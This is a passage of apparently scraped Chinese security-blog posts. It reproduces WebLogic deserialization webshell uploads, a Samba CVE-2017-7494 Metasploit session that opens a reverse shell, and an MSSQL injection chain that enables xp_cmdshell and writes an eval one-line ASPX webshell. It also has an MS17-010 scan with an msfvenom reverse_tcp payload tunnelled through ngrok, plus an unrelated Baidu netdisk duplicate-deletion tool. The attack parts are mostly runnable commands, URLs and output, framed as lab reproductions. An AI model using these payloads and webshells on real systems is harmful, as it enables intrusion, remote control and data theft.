WebLogic Server 12.2.1.0 Oracle WebLogic Server 12.1.3.0 Oracle WebLogic Server 12.1.2.0 Oracle WebLogic Server 10.3.6.0 Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0版本中，WLS Security组件允许远程攻击者执行任意命令。攻击者通过向TCP端口7001发送T3协议流量，其中包含精心构造的序列化Java对象利用此漏洞。此漏洞影响到WLS Security Handler的文件oracle_common/modules/com.bea.core.apache.commons.collections.jar内一个未知的函数。 这里还以SSRF的环境为例。使用WebLogic反序列化工具进行验证（作者：rebeyond)。 一般web项目位于/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/中 发现没有_WL_user目录，所以把shell上传到自带的项目中。 通过执行命令ls /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/发现有三个目录，分别为bea_wls9_async_response、bea_wls_internal和uddiexplorer。将shell文件上传到任意一个目录下的war文件即可。 上传路径/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.txt 上传路径/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/jspy.jsp 也可以使用weget下载。 使用weak_password时，上传路径为 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/_appsdir_hello_war/hnt8u/war/1.txt 找WEB绝对路径的另一种方式，Linux下使用命令find -name *.jsp来查找，例如已知hello项目里面有个file.jsp，则查找的命令为find -name file.jsp。对于Windows下，使用for /r c:\\ %i in (file*.jsp) do @echo %i，也可以通过查看config/config.xml文件内容来确定web项目的绝对路径。 linux下查找文件路径 Windows下查找路径 修复建议： 1.过滤T3协议 2.安装补丁 0x04 总结主要采用了phith0n提供的WebLogic利用环境进行对WebLogic漏洞的验证。包括有WebLogic弱口令获取WEBSHELL、SSRF漏洞利用和WebLogic反序列化漏洞的利用等。总结下来一共有这三个问题。1.对于WebLogic弱口令，如何去上传WEBSHELL2.对于SSRF漏洞，如何探测内网存活的主机以及开放的端口，并如何利用这些端口。3.对于反序列化漏洞，如何快速的找到WEB路径以及对应的物理路径。 0x05 参考[1]https://github.com/phith0n/vulhub/tree/master/weblogic[2]http://blog.csdn.net/chs007chs/article/details/52514888","tags":"ssrf weblogic漏洞 weblogic反序列化"},{"title":"Samba远程代码执行漏洞(CVE-2017-7494)复现过程","url":"/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/","text":"概述Samba是在Linux和UNIX系统上实现SMB协议的一个软件。2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。这里采用ubuntu-16.04.2 x64位为测试机。 复现过程环境的搭建靶机中默认未安装Samba，首先来安装Samba并进行配置。 1sudo apt install samba 安装成功，查看版本 修改Samba配置文件 1sudo gedit /etc/samba/smb.conf 在最底部添加如下内容 1234[fuping] #显示的共享文件夹名字path = /tmppublic = yeswriteable = yes 然后重启smbd服务 1sudo service smbd restart 至此，环境已经搭建成功。开始用Kail进行攻击。 攻击过程首先去下载利用的脚本。 12root@kali:~# cd /usr/share/metasploit-framework/modules/exploits/linux/sambaroot@kali:/usr/share/metasploit-framework/modules/exploits/linux/samba# wget https://raw.githubusercontent.com/hdm/metasploit-framework/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb -O is_known_pipename.rb 然后就是在Metasploit中加载并使用脚本，攻击过程如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112msf &gt; use exploit/linux/samba/is_known_pipenamemsf exploit(is_known_pipename) &gt; show optionsModule options (exploit/linux/samba/is_known_pipename): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port (TCP) SMB_FOLDER no The directory to use within the writeable SMB share SMB_SHARE_BASE no The remote filesystem path correlating with the SMB share name SMB_SHARE_NAME no The name of the SMB share containing a writeable directoryExploit target: Id Name -- ---- 2 Linux x86msf exploit(is_known_pipename) &gt; show targetsExploit targets: Id Name -- ---- 0 Automatic 1 Linux ARM (LE) 2 Linux x86 3 Linux x86_64msf exploit(is_known_pipename) &gt; set RHOST 192.168.232.137RHOST =&gt; 192.168.232.137msf exploit(is_known_pipename) &gt; set target 3target =&gt; 3msf exploit(is_known_pipename) &gt; exploit[*] Started reverse TCP handler on 192.168.232.134:4444[*] 192.168.232.137:445 - Using location \\\\192.168.232.137\\fuping\\ for the path[*] 192.168.232.137:445 - Payload is stored in //192.168.232.137/fuping/ as gRoUnyzb.so[*] 192.168.232.137:445 - Trying location /volume1/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume1/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume1/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume1/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /tmp/gRoUnyzb.so...[*] Command shell session 1 opened (192.168.232.134:4444 -&gt; 192.168.232.137:41392) at 2017-05-24 12:35:20 -0400iduid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)whoaminobodyifconfigdocker0 Link encap:Ethernet HWaddr 02:42:23:77:72:91 inet addr:172.17.0.1 Bcast:0.0.0.0 Mask:255.255.0.0 inet6 addr: fe80::42:23ff:fe77:7291/64 Scope:Link UP BROADCAST MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:2 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 B) TX bytes:180 (180.0 B)ens33 Link encap:Ethernet HWaddr 00:0c:29:77:23:9e inet addr:192.168.232.137 Bcast:192.168.232.255 Mask:255.255.255.0 inet6 addr: fe80::7651:9ad0:80e5:c9c8/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:349052 errors:0 dropped:0 overruns:0 frame:0 TX packets:112974 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:419009840 (419.0 MB) TX bytes:8902292 (8.9 MB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:23329 errors:0 dropped:0 overruns:0 frame:0 TX packets:23329 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1 RX bytes:48010585 (48.0 MB) TX bytes:48010585 (48.0 MB) 需要填写目标地址和选择Target，我的是x64位系统，所以设置了target为3。 效果图 更新2017.05.26 对需要登陆的Smb进行验证脚本已经更新，集成在msf中，直接msfupdate即可。 1.修改Ubuntu中的Samba配置文件。 1sudo gedit /etc/samba/smb.conf 在[global]中添加：security = user修改底部的[fuping] 123[fuping] #显示的共享文件夹名字path = /tmpwriteable = yes 2.添加smb用户 12sudo useradd smbusersudo smbpasswd -a smbuser 3.开始攻击 12345678msf &gt; use exploit/linux/samba/is_known_pipename msf exploit(is_known_pipename) &gt; set SMBUSER smbuserSMBUSER =&gt; smbusermsf exploit(is_known_pipename) &gt; set SMBPASS smbuserSMBPASS =&gt; smbusermsf exploit(is_known_pipename) &gt; set RHOST 192.168.232.137RHOST =&gt; 192.168.232.137msf exploit(is_known_pipename) &gt; exploit 解决方案1.受影响的用户尽快下载最新的Samba版本手动更新。2.使用二进制分发包（RPM等方式）的用户立即进行yum，apt-get update等安全更新操作3.不打补丁的缓解策略：用户可以通过在smb.conf的[global]节点下增加“nt pipe support = no”选项，然后重新启动samba服务， 以此达到缓解该漏洞的效果。 参考[1]https://github.com/rapid7/metasploit-framework/pull/8450[2]http://bobao.360.cn/learning/detail/3900.html[3]https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/","tags":"cve-2017-7494 samba漏洞"},{"title":"如何清除百度网盘重复文件","url":"/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/","text":"0x00 前言百度网盘最近推出了一个垃圾文件清理功能，可以扫描重复的文件，就试了一下。扫描结果发现存在许多的重复文件，删除后空间可以再多一个T。就想删除一下，结果需要开通会员。于是就想着来实现一下如何快速删除网盘重复的文件。要实现这个功能，第一首先要知道重复的文件，第二就是对这些重复的文件进行删除了。 0x01 如何获取重复的文件这里以wap版为例。打开https://pan.baidu.com/wap/home 并抓包。可以看到一个Get请求 1https://pan.baidu.com/api/list?bdstoken=***********&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTYxMjU1OTQ1NDAuOTE2MjI3ODg0NjE5MTU0Ng==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page=1&amp;num=20&amp;dir=%2F 主要请求参数： 参数名 备注 bdstoken 网页源代码中有 loginid BASE64(时间戳+四位+.+16位数字)，固定值即可 page 页码 num 每页显示条数 dir 文件路径 order 排序的条件（固定时间排序即可） desc 升序降序（降序排列即可） 其他参数固定值即可返回内容为JSON 当遇到文件时，会返回文件的MD5和大小以及路径。 返回JSON中的主要内容说明只列举需要的字段 名称 含义 备注 isdir 是否为目录 文件为0，目录为1 size 文件大小 单位是字节 md5 文件的MD5值 可以用来判断文件是否重复 path 文件的路径 包含文件名 server_filename 文件名称 文件的名称 于是可以根据文件的MD5值来判断文件是否重复。首先将文件的主要信息（如MD5、大小、路径、名字）等信息保存到数据库中。然后根据MD5来判断是否重复，将重复的文件列出来，最后就是删除了。这里采用的开发语言是Java，Http请求采用了jsoup，处理Json采用了FastJson。数据库采用了MySQL。因为主要是为了分享思路，所以只贴部分代码了，知道怎么实现这个流程，代码写起来就简单许多了，实现的语言也就多样化了。具体实现步骤如下： 1.获取bdstoken访问https://pan.baidu.com/wap/home ，查看源代码搜索bdstoken即可看到。代码的实现如下： 123456789101112131415/** * 获取bdstoken * @return bdstoken */public static String getbdstoken()&#123; String bdstoken = null; Document doc = getDoc(Util.URL_HOME,getCookies()); String regex = \"\\\"bdstoken\\\":\\\"(.*)\\\",\\\"quota\"; Pattern pattern = Pattern.compile(regex); Matcher matcher = pattern.matcher(doc.html()); if(matcher.find())&#123; bdstoken = matcher.group(1); &#125; return bdstoken;&#125; Cookie只需要两个内容，一个是BDUSS，另一个是STOKEN。 1234567public static Map&lt;String,String&gt; getCookies()&#123; Map&lt;String,String&gt; cookies = new HashMap&lt;String, String&gt;(); cookies.put(\"BDUSS\", \"你的BDUSS\"); cookies.put(\"STOKEN\", \"你的STOKEN\"); return cookies;&#125; 2.递归获取所有的文件，并将文件的相关内容保存到数据库中获取每页文件内容时需要三个参数：当前页面、每页显示数量和路径。如下代码所示： 123456789101112131415/** * 列出当前页面文件 * @param page 页面 * @param num 显示数量 * @param dir 路径 * @return */public static List&lt;PanFile&gt; getFiles(int page,int num,String dir)&#123; String url = \"https://pan.baidu.com/api/list?bdstoken=\"+getbdstoken()+\"&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTQxMzA2Njg4ODAuODE0NzYwMjEyMzAzOTY5Mg==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page=\"+page+\"&amp;num=\"+num+\"&amp;dir=\"+dir; String jsonStr = getbody(url, getCookies()); JSONObject jsonObj = JSONObject.parseObject(jsonStr); JSONArray result = jsonObj.getJSONArray(\"list\"); List&lt;PanFile&gt; files= JSON.parseArray(result.toJSONString(),PanFile.class); return files;&#125; 递归遍历当前路径下所有文件代码如下： 123456789101112131415161718192021222324252627282930313233/** * 递归打印当前路径下所有文件，并入库 * @param str 路径 */public static void printFiles(String str)&#123; boolean flag=false; String dency[] = &#123;\"/C#资料/我的c#\",\"/12-19 Java Workplace\",\"/dumppp\",\"/myWEB\"&#125;;//白名单，针对其中的目录不遍历 for (String string : dency) &#123; if(str.trim().equals(string))&#123; flag = true; &#125; &#125; if(!flag)&#123; try &#123; str = URLEncoder.encode(str, \"utf-8\"); &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; List&lt;PanFile&gt; files= UtilMethod.getFiles(1,2000,str); for (PanFile panFile : files) &#123; if(panFile.getIsdir()==1)&#123; printFiles(panFile.getPath()); &#125;else&#123; String fileName = panFile.getPath(); System.out.println(fileName+\"---size:\"+panFile.getSize()+\"--md5:\"+panFile.getMd5()); insertDB(panFile.getServerMtime(),panFile.getCategory(),panFile.getFsId(),panFile.getIsdir(), panFile.getServerCtime(),panFile.getLocalMtime(),panFile.getSize(),panFile.getMd5(), panFile.getPath(),panFile.getLocalCtime(),panFile.getServerFilename()); &#125; &#125; &#125;&#125; 效果如图所示 查看数据库中的文件信息 由于有些目录下面是代码，而且文件多有小，所以就不针对这些文件目录下的文件进行遍历。就采用了白名单的方式，对白名单中内容不遍历。由于某些路径中含有其他字符，导致找不到路径，使用采用了URL编码。为了方便，直接将page设置为1，num值换为2000（可以根据自己的文件多少来调节，最好大一些），一页就将所有的数据显示出来。插入数据库方法的代码比较简单，这里就省略了。 3.获取重复的大文件已经将文件的信息都存储在数据库中，然后根据数据库中文件的MD5来获取重复的文件。我这里只把大于500M的重复文件给列举出来。 1.获取大于500M的重复文件的MD5123456789101112131415161718192021222324252627282930/** * 获取大于500M的重复文件的MD5 * @return */public static List&lt;String&gt; setp1()&#123; List&lt;String&gt; ltMd5 = new ArrayList&lt;String&gt;(); String sql = \"select count(*),md5,server_filename from mmpan \" + \"where size &gt; 1024*1024*500 \" + \"group by md5 \" + \"HAVING COUNT(md5) &gt;1 \" + \"order by path\"; Connection conn = DBFactory.getConnection(); PreparedStatement pst = null; ResultSet rst = null; try &#123; pst = conn.prepareStatement(sql); rst = pst.executeQuery(); while(rst.next())&#123; ltMd5.add(rst.getString(\"md5\")); &#125; &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; DBFactory.close(rst, pst, conn); &#125; return ltMd5; &#125; 2.根据步骤1获取文件的MD5值，获取最小path的长度1234567891011121314151617181920212223242526/** * 根据文件的MD5值，获取最小path的长度 * @param md5 * @return */public static int setp2(String md5)&#123; int length = -1; String sql = \"select min(LENGTH(path)) from mmpan where md5=?\"; Connection conn = DBFactory.getConnection(); PreparedStatement pst = null; ResultSet rst = null; try &#123; pst = conn.prepareStatement(sql); pst.setString(1, md5); rst = pst.executeQuery(); if(rst.next())&#123; length = rst.getInt(1); &#125; &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; DBFactory.close(rst, pst, conn); &#125; return length;&#125; 3.根据MD5和最短路径，列出大于最短路径的文件12345678910111213141516171819202122232425262728/** * 根据MD5和最短路径，列出大于最短路径的文件 * @param md5 * @param length * @return */public static List&lt;String&gt; setp3(String md5,int length)&#123; List&lt;String&gt; ltPath = new ArrayList&lt;String&gt;(); String sql = \"select path from mmpan where md5=? and LENGTH(path) &gt; ?\"; Connection conn = DBFactory.getConnection(); PreparedStatement pst = null; ResultSet rst = null; try &#123; pst = conn.prepareStatement(sql); pst.setString(1, md5); pst.setInt(2, length); rst = pst.executeQuery(); while(rst.next())&#123; ltPath.add(rst.getString(1)); &#125; &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; DBFactory.close(rst, pst, conn); &#125; return ltPath;&#125; 获取这个列表是为了将其删除 将以上三步综合起来，如下 123456789101112131415161718/** * 获取指定条件下文件路径 * @return */public static List&lt;String&gt; getPaths()&#123; List&lt;String&gt; ltPath = null; List&lt;String&gt; ltPaths = new ArrayList&lt;String&gt;(); List&lt;String&gt; lt = UtilMethod.setp1(); int length = -1 ; for (String md5 : lt) &#123; length = UtilMethod.setp2(md5); ltPath = UtilMethod.setp3(md5, length); for (String path : ltPath) &#123; ltPaths.add(path); &#125; &#125; return ltPaths;&#125; 此时列表中的文件都是为了删除的文件的路径。 0x02 如何实现删除文件删除文件时抓包，发现如下请求 12345678POST /api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken=****&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0 HTTP/1.1Host: pan.baidu.comX-Requested-With: XMLHttpRequestCookie: CookieConnection: closeContent-Length: 61filelist=%5B%22%2F000%2F%E7%A4%BE%E5%B7%A5%E5%BA%93.rar%22%5D 所需参数有bdstoken和删除文件的列表 我们首先将需要删除文件拼接起来 12345678910111213141516171819/** * 根据文件路径拼接filelist * @return */public static String getFileList()&#123; List&lt;String&gt; ltPath = UtilMethod.getPaths(); StringBuilder sb = new StringBuilder(); sb.append(\"[\"); for (int i = 0; i &lt; 3; i++) &#123; //System.out.println(ltPath.get(i)); sb.append(\"\\\"\"); sb.append(ltPath.get(i)); sb.append(\"\\\"\"); sb.append(\",\"); &#125; sb.append(\"***]\"); return sb.toString().replace(\",***\", \"\");&#125; 为了测试，我仅仅先删除三条进行测试。如果需要全部删除，将3换成ltPath.size()即可。 删除文件的代码如下： 123456789101112131415/** * 根据文件列表删除文件 * @param filelist * @return */public static String delRequest(String filelist)&#123; String url = \"https://pan.baidu.com/api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken=\"+getbdstoken()+\"&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0\"; String result = \"删除失败,请重试\"; String jsonStr = getbody(url, getCookies(),filelist); JSONObject jsonObj = JSONObject.parseObject(jsonStr); if(jsonObj.get(\"errno\").toString().equals(\"0\"))&#123; result = \"文件删除成功，删除成功的文件为\"+filelist; &#125; return result;&#125; 测试删除的代码如下： 123456@Testpublic void testdelFile()&#123; String fileList = UtilMethod.getFileList(); System.out.println(UtilMethod.delRequest(fileList));&#125; 附上效果图 大功告成。不过删除的时候要注意一下，删除错误的话可以去回收站查看，然后再恢复。不要急于清除回收站。代码仅供参考。代码地址：代码Python的实现脚本https://github.com/fupinglee/MyPython/blob/master/baidu/BDPandel.py 。python代码删除文件效果图 还有一种最快的实现方法就是开个会员o(╯□╰)o。 0x03 总结本文没有什么大的知识点，都是常用的内容拼接在了一起。主要用到了三方面的内容：1.如何模拟网络请求抓取数据。这里采用了Java代码，Http请求采用了Jsoup。2.JSON解析，使用了FastJSON来实现3.递归遍历的实现 Python的实现也就是请求Http和数据库的操作。使用Python时要多注意数据类型和编码的转换。","tags":"百度网盘 快速清除 java代码 python脚本"},{"title":"MSSQL DBA权限获取WEBSHELL的过程","url":"/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/","text":"前言本文主要通过一个案例来演示一下当MSSQL是DBA权限，且不知道路径的时候如何去获取WEBSHELL。当然这种方式对站库分离的无效。我测试的环境是在Win7 64位下，数据库是SQLServer 2000，IIS版本是7.5，程序是采用风讯的CMS。后台登录后有多处注入，因为这里是演示用注入获取WEBSHELL，因此就不考虑后台上传的情况了，只是用注入来实现。 过程首先找到一个如下的注入点： 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1' and 1=user;-- 通过SQLMAP可以查看到是DBA权限 创建临时表 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';CREATE TABLE tt_tmp (tmp1 varchar(8000));-- 在WINDOWS下查找文件用如下命令： 1for /r 目录名:\\ %i in (匹配模式) do @echo %i 例如在C盘下搜索NewsList.aspx，可以使用for /r c:\\ %i in (Newslist*.aspx) do @echo %i或者for /r c:\\ %i in (Newslist.aspx*) do @echo %i 使用for /r c:\\ %i in (Newslist*.aspx) do @echo %i的搜索结果 一定要在匹配模式里面加上一个*号，不然搜索出来的是全部的目录，后面拼接了你搜索的内容。使用for /r c:\\ %i in (Newslist.aspx) do @echo %i的搜索结果 用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';insert into tt_tmp(tmp1) exec master..xp_cmdshell 'for /r c:\\ %i in (Newslist*.aspx) do @echo %i ';-- 如果无法执行xp_cmdshell，并提示如下错误SQL Server阻止了对组件‘xp_cmdshell’的过程‘sys.xp_cmdshell’的访问。因为此组件已作为此服务嚣安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用‘xp_cmdshell’。 可以使用如下命令来启用xp_cmdshell 1234;EXEC sp_configure 'show advanced options',1;//允许修改高级参数RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; //打开xp_cmdshell扩展RECONFIGURE;-- 然后再次执行搜索命令。 在执行上述搜索和插入过程后，可以使用&#39; and (select(*) from tt_tmp)&gt;1页面返回是否正常来判断是否有搜索结果。当没有找到的话，select(*) from tt_tmp的结果为1，否则大于1。如果没有的话，就换目录，可以试试其他盘符，如&#39;;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;for /r d:\\ %i in (Newslist*.aspx) do @echo %i &#39;;--。也可以使用sqlmap来查看条数。 可以用报错将表内容给显示出来 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2' and 1=(select top 1 tmp1 from tt_tmp)and 'a'='a 继续爆 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2' and 1=(select top 1 tmp1 from tt_tmp where tmp1 not in ('c:\\inetpub\\wwwroot\\manage\\news\\NewsList.aspx '))and 'a'='a 也可以用sqlmap直接将表中数据读取出来 然后根据导出结果的路径来判断是否可能为WEB目录。然后写入一个测试文件，看是否可以访问来进一步证实结果。 这里在根目录写了一个txt文件，写别的目录怕因为没有权限而无法访问。 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';exec master..xp_cmdshell 'echo test &gt;c:\\\\WWW\\\\2333.txt';-- 然后访问http://192.168.232.138:81/2333.txt 成功访问，然后就是写一句话 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';exec master..xp_cmdshell 'echo ^&lt;%@ Page Language=\"Jscript\"%^&gt;^&lt;%eval(Request.Item[\"pass\"],\"unsafe\");%^&gt; &gt; c:\\\\WWW\\\\233.aspx' ;-- 成功写入。然后就是进一步的操作了，这里就不概述了。 DOS命令将文件写入文本中时，遇到&lt;&gt;应在前面加上^。 总结这里一共有三个小的知识点:1.sa用户如何开启xp_cmdshell 1234EXEC sp_configure 'show advanced options',1;//允许修改高级参数RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; //打开xp_cmdshell扩展RECONFIGURE; 2.Windows下利用dos如何搜索文件 12for /r c:\\ %i in (Newslist*.aspx) do @echo %ifor /r c:\\ %i in (Newslist.aspx*) do @echo %i 3.dos命令下写文件遇到&lt;&gt;如何处理 1echo ^&lt;^&gt; &gt; 123.txt 参考[1]Windows命令行(cmd)下快速查找文件(类似Linux下find命令) [2]技术分享：MSSQL注入xp_cmdshell","tags":"mssql webshell aspx"},{"title":"MS17-010漏洞检测与内网穿透技术的应用","url":"/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/","text":"0x00 前言本文主要介绍一下MSF模块的下载、使用，以及当攻击机处于内网，而目标机也处于内网的解决方法。这里借助MS17-010漏洞来具体讲解一下，并没有新的知识点，可以为刚入门的新手抛砖引玉，提供一条解决问题的思路，同时也记录一下过程，加强记忆。主要分为两个知识点，一是SMB漏洞的批量检测，二是内网穿透技术。 首先是环境的搭建，具体如下表所示： | 主机 | IP |备注||——–|——–|| Kali 64位 | 192.168.232.134 |攻击机| Windows XP 32位 | 192.168.232.128 |安装了python2.6，下载有方程式利用工具包（主要为Windows目录下的工具）| Window2008 R2 64位 | 10.50.2.62 |靶机，存在MS17-010漏洞，并可以访问外网 0x01 SMB漏洞批量检测1.扫描脚本的下载和加载由于Metasploit还没有更新MS17-010检测的模块，所以要去exploit-db下载，并在MSF中加载。 12root@kali:~# cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smbroot@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/smb# wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb 启动Metasploit，模块会自动加载，或者使用命令reload_all重新加载所有模块。 2.漏洞扫描的使用方法选择使用smb_ms_17_010模块，并查看使用命令。 12msf &gt; use auxiliary/scanner/smb/smb_ms_17_010msf auxiliary(smb_ms_17_010) &gt; show options 所必须的参数有三个，对于无需登录的SMB，我们只需设置一下扫描的IP段、线程并运行即可开始扫描。 12345msf auxiliary(smb_ms_17_010) &gt; set RHOSTS 10.50.2.1-255RHOSTS =&gt; 10.50.2.1-255msf auxiliary(smb_ms_17_010) &gt; set THREADS 10THREADS =&gt; 10msf auxiliary(smb_ms_17_010) &gt; run 出现黄色警告的表示可能存在，需要进一步验证。为了方便将存在漏洞的IP列出来，写了一个简单的Python脚本。 1234567891011import reif __name__ == '__main__': f = open(\"smb.txt\", mode='r', buffering=1) while(True): line = f.readline() if line : if \"likely\" in line: print line.split(' ')[1].split(':')[0] else: break 提取出的IP如下所示： 12345678910111213.....10.50.2.5210.50.2.6210.50.2.6510.50.2.6110.50.2.6310.50.2.6410.50.2.7610.50.2.6910.50.2.7710.50.2.7810.50.2.79.... 有了存在漏洞的地址，接下来将开始对其进行验证，以10.50.2.62为例。由于Kali在虚拟机，宿主机IP为2.0..，目标机在10.50.2.*。相当于需要从内网到另一个内网， 选择采用了ngrok进行tcp的端口转发来实现内网的穿透。 0x02 内网穿透这里采用了www.ngrok.cc平台进行演示，类似这样的平台有很多，例如natapp.cn等。注册并开通隧道，如图所示。 下载对应的客户端，下载地址为：https://www.ngrok.cc/#down-client ，选择与系统对应的软件。我这里Kali为64位的，下载和使用命令如下： 12345root@kali:~/Downloads# wget hls.ctopus.com/sunny/linux_amd64.ziproot@kali:~/Downloads# unzip linux_amd64.ziproot@kali:~/Downloads# cd linux_amd64/root@kali:~/Downloads/linux_amd64# lsroot@kali:~/Downloads/linux_amd64# ./sunny clientid 隧道ID 出现下图的界面表示运行成功。 使用如下命令生成用于监听的dll文件。监听的IP为server.ngrok.cc的地址，端口为开通隧道时填写的远程端口。 1root@kali:~/Documents# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.90.92.56 LPORT=6266 -f dll &gt; got.dll 然后在Kali上设置监听本机的IP和端口，也就是在开通隧道时填写的本地端口。 12345use exploit/multi/handlerset LHOST 192.168.232.134set LPORT 5555set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; exploit 由于关于Eternalblue利用方法有很多教程了，这里就不详细说明了，如图所示。攻击成功时查看ngrok客户端发现有一个连接。而且Kali上也生成了一个meterpreter会话。之后的操作就很简单了，可以添加用户等等。最后远程登录成功如下图所示。使用natapp也是可以的。 0x03 总结本文主要以MS17-010为例，讲解了如何下载和利用Metasploit中没有的模块，以及如何解决内网到内网的穿透的问题，当然解决的方法还有很多，这里就不再介绍了。 没有什么新的知识，怕忘记所以记录一下~~ 0x04 参考[1]https://www.exploit-db.com/exploits/41891/[2]http://bobao.360.cn/learning/detail/3041.html","tags":"ms17-010 metasploit 